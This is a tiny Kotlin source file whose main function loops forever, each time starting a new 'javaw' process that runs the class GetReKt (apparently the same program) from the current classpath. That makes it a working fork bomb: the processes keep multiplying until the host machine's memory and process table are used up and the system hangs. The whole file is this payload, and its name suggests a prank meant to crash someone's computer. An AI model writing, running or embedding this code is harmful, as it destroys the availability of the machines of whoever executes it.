package com.nishtahir

fun main(args: Array<String>) {
    while (true) {
        Runtime.getRuntime().exec(
                String.format("javaw -cp %s com.nishtahir.GetReKt", System.getProperty("java.class.path"))
        )
    }
}
